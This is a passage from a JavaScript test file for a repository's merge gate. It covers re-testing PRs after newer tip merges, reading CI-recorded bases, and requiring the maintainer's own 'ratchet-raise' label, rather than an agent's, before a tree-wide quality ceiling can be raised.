    assert.equal(slow.ok, false);
    assert.equal(slow.evidence, `1 tip merge(s) since the CI run (${tip.slice(0, 8)}); the re-test of 1 unit file(s) on the merge onto ${tip.slice(0, 8)} failed: timed out after 420 s — the PR and the newer tip cross; sync-pr.mjs, fix, and push (a fresh CI run)`);
    // Un-runnable never passes: no CI time, a selection that cannot run, a git error.
    assert.equal(retestOnMerge({ cwd: W, tip, head, ciAt: "", run, select }).ok, false);
    assert.equal(retestOnMerge({ cwd: W, tip, head, ciAt: "", run, select }).evidence, 're-test not runnable: the CI run\'s creation time is unreadable ("")');
    assert.equal(retestOnMerge({ cwd: W, tip, head, ciAt, run, select: () => ({ error: "tooling-fast selection failed: boom" }) }).evidence, "re-test not runnable: tooling-fast selection failed: boom");
    assert.equal(retestOnMerge({ cwd: W, tip: "f".repeat(40), head, ciAt, run, select }).ok, false, "an unknown tip refuses");
    // Measured too broad for the cap: refused up front, nothing runs (the cure is a sync and a fresh CI run).
    calls.length = 0;
    const broad = retestOnMerge({ cwd: W, tip, head, ciAt, run, select: (p) => ({ ...select(p), estMs: 400_000 }) });
    assert.equal(broad.ok, false);
    assert.equal(broad.evidence, `1 tip merge(s) since the CI run (${tip.slice(0, 8)}); the re-test would run 1 unit file(s), measured ~400 s at --jobs=2, over the 420 s cap — too broad to re-test at merge: sync-pr.mjs and push, so a fresh CI run tests this combination`);
    assert.equal(calls.length, 0);
    assert.equal(retestOnMerge({ cwd: W, tip, head, ciAt, run, select: (p) => ({ ...select(p), estMs: 30_000 }) }).ok, true, "a measured-small re-test runs");
    // A merge just BEFORE the CI run's creation (inside the margin) may be missing from its merge ref: re-tested too.
    assert.equal(RETEST_MARGIN_MIN, 15);
    assert.equal(newerTipPaths({ cwd: W, tip, head, ciAt: "2026-11-11T01:50:00Z" }).commits.length, 1, "01:44:54 is inside 01:50 - 15 min");
    assert.equal(newerTipPaths({ cwd: W, tip, head, ciAt: "2026-11-11T02:00:00Z" }).commits.length, 0);
    // A date is not a commit: when the run recorded the base its merge ref sat on, every tip commit after that base
    // is re-tested even if the time window misses it (here the 00:20 "old merge" is outside 02:00 − 15 min).
    const baseSha = git(W, undefined, "rev-parse", "HEAD~2");
    const wide = newerTipPaths({ cwd: W, tip, head, ciAt: "2026-11-11T02:00:00Z", ciBase: baseSha });
    assert.deepEqual([wide.commits.length, wide.base, wide.newer], [2, baseSha, [U("old"), "tests/unit/tools-runnable.test.mjs"]]);
    // Union only: a recorded base never narrows the time window; an unknown base is ignored.
    assert.equal(newerTipPaths({ cwd: W, tip, head, ciAt, ciBase: tip }).commits.length, 1, "the window still holds #5392");
    assert.deepEqual([newerTipPaths({ cwd: W, tip, head, ciAt: "2026-11-11T02:00:00Z", ciBase: "e".repeat(40) }).commits.length], [0]);
  } finally { fs.rmSync(T, { recursive: true, force: true }); }
});

test("#5407 ciRecordedBase: the green run's tooling A `apex-guards` annotation names the base its merge ref sat on; unreadable is \"\"", () => {
  const B = "b".repeat(40);
  const req = (p) => p.startsWith("actions/runs/500/jobs") ? { json: { jobs: [{ id: 11, name: "Smoke (a)" }, { id: 12, name: "Structural guards (tooling A)" }] } }
    : p.startsWith("check-runs/12/annotations") ? { json: [{ title: "other", message: "x" }, { title: "apex-guards", message: `mode=changed base=${B}` }] } : { error: `unexpected ${p}` };
  assert.equal(ciRecordedBase({ id: 500 }, req), B);
  assert.equal(ciRecordedBase({ id: 500 }, (p) => (p.startsWith("check-runs/") ? { json: [{ title: "apex-guards", message: "mode=full base=none" }] } : req(p))), "");
  assert.equal(ciRecordedBase({ id: 500 }, () => ({ error: "HTTP 502" })), "");
  assert.equal(ciRecordedBase(undefined, req), "");
});

test("#5407 retestPlan: the gate's own selection, kept to files the merge has; a widened selection falls back to the touched unit files and says so", () => {
  const has = (f) => f !== U("deleted");
  assert.deepEqual(retestPlan({ newer: ["js/a.js", U("b")], pr: [U("deleted")], selection: { files: [U("a")], reason: "matched" }, exists: has }),
    { files: [U("a"), U("b")], how: "tooling-fast's --changed selection (matched)" });
  assert.deepEqual(retestPlan({ newer: ["package.json", U("b")], pr: [U("c")], selection: { files: ["x"], widened: "package.json forces full suite" }, exists: has }),
    { files: [U("b"), U("c")], how: "the touched tests/unit files (the selection widened: package.json forces full suite)" });
  assert.deepEqual(retestPlan({ newer: [["docs", "x.md"].join("/")], pr: [], selection: { files: [], reason: "docs" } }).files, []);
});

test("#5407 evaluate: the retest row is local (never --trusted), waits with a pending ci row, and a refused re-test refuses the gate", () => {
  assert.deepEqual(LOCAL_ROWS, ["gen", "ratchets", "retest"]);
  assert.deepEqual(TRUSTED_ROWS.filter((k) => k === "retest"), [], "the re-test runs PR code: not a trusted row");
  const f = fakes();
  const cross = (a) => ({ ok: true, evidence: "merges clean", tip: TIP, ratchets: { ok: true, evidence: "hold" }, retest: { ok: false, evidence: "the re-test failed" } });
  const v = evaluate({ pr: 7, ...f.deps, localMerge: cross });
  assert.deepEqual([v.ok, ROWS.filter((k) => !v.rows[k].ok)], [false, ["retest"]]);
  const none = evaluate({ pr: 7, ...f.deps, localMerge: () => ({ ok: true, evidence: "merges clean", tip: TIP, ratchets: { ok: true, evidence: "hold" } }) });
  assert.deepEqual(ROWS.filter((k) => !none.rows[k].ok), ["retest"], "a merge result with no re-test is never a pass");
  f.checks[1].status = "in_progress";
  const wait = evaluate({ pr: 7, ...f.deps });
  assert.equal(f.calls.at(-1).ciAt, null, "no green CI yet: the re-test is not run");
  assert.deepEqual([wait.ok, wait.waiting, wait.rows.retest.pending], [false, true, true], "a pending CI keeps the gate waiting, not refused");
});

// ---- #5405 option (b), Bryce 2026-11-11 ~09:10Z "Build the check (Recommended)" ---------------------------------

/** A fixture ratchets.d fragment path no tree carries, built so the source-path lint does not read it as a reference. */
const FRAG = (name) => ["tests", "data", "ratchets.d", `${name}.json`].join("/");

test("#5405 raise: a tree-wide ceiling raise needs Bryce's own ratchet-raise, bound to the head; lower, unchanged and per-file pass", () => {
  assert.equal(RAISE_LABEL, "ratchet-raise");
  const b64 = (o) => ({ json: { encoding: "base64", content: Buffer.from(JSON.stringify(o)).toString("base64") } });
  const MB = "m".repeat(40);
  // The merge base: assertPins 100 in the table plus a +5 fragment from an earlier PR; a per-file ceiling beside it.
  const at = {
    [MB]: { table: { tree: { assertPins: { ceiling: 100, slack: 5 }, bareCatches: { ceiling: 10 } }, files: { "css/hud.css": { lines: 900 } } }, frags: { [FRAG("old")]: { tree: { assertPins: 5 } } } },
    [HEAD]: { table: { tree: { assertPins: { ceiling: 100, slack: 5 }, bareCatches: { ceiling: 10 } }, files: { "css/hud.css": { lines: 900 } } }, frags: { [FRAG("old")]: { tree: { assertPins: 5 } }, [FRAG("cursor--x")]: { tree: { assertPins: 3 }, files: { "css/hud.css": { lines: 20 } } } } },
  };
  const ghRequest = (p) => {
    const m = /^contents\/(.+)\?ref=(\w+)$/.exec(p);
    if (!m) return null;
    const [, file, ref] = m, side = at[ref];
    if (!side) return { error: "HTTP 404" };
    if (file === "tests/data/ratchets.json") return b64(side.table);
    if (file === "tests/data/ratchets.d") return { json: Object.keys(side.frags).map((f) => ({ type: "file", name: f.split("/").pop(), path: f })) };
    return side.frags[file] ? b64(side.frags[file]) : { error: "HTTP 404" };
  };
  assert.deepEqual(treeCeilingsAt(MB, ghRequest), { tree: { assertPins: 105, bareCatches: 10 } });
  assert.deepEqual(treeRaises({ a: 1, b: 5 }, { a: 2, b: 4, c: 9 }), [{ metric: "a", from: 1, to: 2 }], "lowered and new ceilings are no raise");
  // Deleting a tree metric removes its ceiling (ratchets.mjs measures only what ratchets.json names): a raise.
  assert.deepEqual(treeRaises({ assertPins: 8223, bareCatches: 29 }, { assertPins: 8223 }), [{ metric: "bareCatches", from: 29, to: null }]);
  assert.equal(raiseVerdict([{ metric: "bareCatches", from: 29, to: null }], [], []).evidence, "needs ratchet-raise from brycejmurrin: the diff raises a tree-wide ceiling (bareCatches 29→removed) — lower the count instead, or ask him");
  const f = fakes();
  f.files.push({ filename: FRAG("cursor--x") });
  const request = (p) => ghRequest(p) || (p.startsWith("compare/") ? { json: { merge_base_commit: { sha: MB }, files: [{ filename: FRAG("cursor--x") }] } } : f.deps.request(p));
  const rowOf = () => { const v = evaluate({ pr: 7, ...f.deps, request, trusted: true }); assert.ok(v.rows, v.error); return v.rows.raise; };
  // Raise without the label: refused, naming the metric.
  let r = rowOf();
  assert.equal(r.ok, false);
  assert.equal(r.evidence, "needs ratchet-raise from brycejmurrin: the diff raises a tree-wide ceiling (assertPins 105→108) — lower the count instead, or ask him");
  // An agent's label (through an app) never counts.
  f.pull.labels = [{ name: "ratchet-raise" }]; f.events.push(ev("ratchet-raise", "2026-11-03T10:00:00Z", { app: APP }));
  r = rowOf();
  assert.equal(r.ok, false);
  assert.equal(r.evidence, "needs ratchet-raise from brycejmurrin: the label was last added by brycejmurrin via app claude — only his own click counts (raises assertPins 105→108)");
  // Bryce's own click after the head was pushed (its first ci.yml run, 09:00): passes.
  f.events.push(ev("ratchet-raise", "2026-11-03T10:30:00Z"));
  r = rowOf();
  assert.equal(r.ok, true, r.evidence);
  assert.equal(r.evidence, "ratchet-raise added by brycejmurrin at 2026-11-03T10:30:00Z covers assertPins 105→108 (labelled after the head aaaaaaaa was pushed)");
  // A push touching a ratchet file after his label: a fresh label is needed.
  f.prRuns.push({ head_sha: "c".repeat(40), created_at: "2026-11-03T09:30:00Z", pull_requests: [{ number: 7 }] });
  f.prRuns[0].created_at = "2026-11-03T11:00:00Z";
  at["c".repeat(40)] = at[MB]; // the head he labelled raised nothing yet
  r = rowOf();
  assert.equal(r.ok, false);
  assert.equal(r.evidence, "needs a fresh ratchet-raise from brycejmurrin: a push touching " + FRAG("cursor--x") + " (cccccccc...aaaaaaaa) came after his label at 2026-11-03T10:30:00Z (remove and re-add it)");
  // …unless the head he labelled raised as much: a sync that only brought other PRs' fragments needs no re-click.
  const C = "c".repeat(40);
  at[C] = at[HEAD];
  r = rowOf();
  assert.equal(r.ok, true, r.evidence);
  assert.equal(r.evidence, "ratchet-raise added by brycejmurrin at 2026-11-03T10:30:00Z covers assertPins 105→108 (the pushes since cccccccc touch a ratchet file but raise nothing beyond what he labelled there)");
  // A further raise after his click is not covered.
  at[C] = { ...at[HEAD], frags: { ...at[HEAD].frags, [FRAG("cursor--x")]: { tree: { assertPins: 1 } } } };
  assert.equal(rowOf().ok, false, "105→108 now vs 105→106 when he clicked");
  delete at[C];
  f.prRuns.pop(); f.prRuns[0].created_at = "2026-11-03T09:00:00Z";
  // A lowered ceiling (and a per-file raise beside it) needs no label.
  f.pull.labels = []; f.events.length = 0;
  at[HEAD].frags[FRAG("cursor--x")] = { tree: { assertPins: -2 }, files: { "css/hud.css": { lines: 20 } } };
  r = rowOf();
  assert.deepEqual(r, { ok: true, evidence: "no tree-wide ratchet ceiling rises or is removed in the diff (per-file ceilings are the commit hook's --auto-raise, not this row's)" });
  // No ratchet file in the diff: no reads at all.
  f.files.pop();
  assert.deepEqual(evaluate({ pr: 7, ...f.deps, trusted: true }).rows.raise, { ok: true, evidence: "no ratchet ceiling file in the diff" });
  // Unreadable ceilings are an error (the gate retries), never a pass.
  f.files.push({ filename: "tests/data/ratchets.json" });
  const broken = (p) => (p.startsWith("contents/tests/data/ratchets.json") ? { error: "HTTP 502" } : request(p));
  assert.equal(evaluate({ pr: 7, ...f.deps, request: broken, trusted: true }).error, "tests/data/ratchets.json at mmmmmmmm: HTTP 502");
  assert.equal(raiseVerdict([], [], []).ok, true);
});

test("#5405 raisesCovered: a later raise is covered only by an equal or larger one on the same metric; a removal only by a removal", () => {
  const r = (metric, from, to) => ({ metric, from, to });
  assert.equal(raisesCovered([], []), true);
  assert.equal(raisesCovered([r("a", 10, 12)], [r("a", 20, 23)]), true, "the amount counts, not the absolute (a sync moves both)");
  assert.equal(raisesCovered([r("a", 10, 14)], [r("a", 20, 23)]), false);
  assert.equal(raisesCovered([r("b", 1, 2)], [r("a", 1, 9)]), false, "another metric is a new raise");
  assert.equal(raisesCovered([r("a", 5, null)], [r("a", 5, 99)]), false, "a removal is wider than any amount");
  assert.equal(raisesCovered([r("a", 5, 99)], [r("a", 5, null)]), true);
});

test("#5405 a weekly fold (fragments deleted, the table raised by the same amounts) is no raise; a fold that really rises is", () => {
  const b64 = (o) => ({ json: { encoding: "base64", content: Buffer.from(JSON.stringify(o)).toString("base64") } });
  const side = (table, frags) => ({ table, frags });
  const reqFor = (s) => (p) => {
    const m = /^contents\/(.+)\?ref=\w+$/.exec(p);
    if (!m) return { error: `unexpected ${p}` };
    if (m[1] === "tests/data/ratchets.json") return b64(s.table);
    if (m[1] === "tests/data/ratchets.d") return Object.keys(s.frags).length ? { json: Object.keys(s.frags).map((f) => ({ type: "file", name: f.split("/").pop(), path: f })) } : { error: "HTTP 404 Not Found" };
    return s.frags[m[1]] ? b64(s.frags[m[1]]) : { error: "HTTP 404" };
  };
  // #5518's shape: rawGameReads 299 + a +5 fragment, assertPins 8223 + a −29 fragment → folded into 304 / 8194.
  const before = side({ tree: { rawGameReads: { ceiling: 299 }, assertPins: { ceiling: 8223 } } },
    { [FRAG("a")]: { tree: { rawGameReads: 5 } }, [FRAG("b")]: { tree: { assertPins: -29 } } });
  const folded = side({ tree: { rawGameReads: { ceiling: 304 }, assertPins: { ceiling: 8194 } } }, {});
  const a = treeCeilingsAt("x", reqFor(before)), b = treeCeilingsAt("y", reqFor(folded));
  assert.deepEqual([a.tree, b.tree], [{ rawGameReads: 304, assertPins: 8194 }, { rawGameReads: 304, assertPins: 8194 }], "effective ceilings, not the raw table");
  assert.deepEqual(treeRaises(a.tree, b.tree), [], "the fold moves numbers, the ceilings are equal");
  // The trap: fold-shaped, but the table rises past what the fragments carried.
  const sneaky = side({ tree: { rawGameReads: { ceiling: 310 }, assertPins: { ceiling: 8194 } } }, {});
  assert.deepEqual(treeRaises(a.tree, treeCeilingsAt("z", reqFor(sneaky)).tree), [{ metric: "rawGameReads", from: 304, to: 310 }]);
});
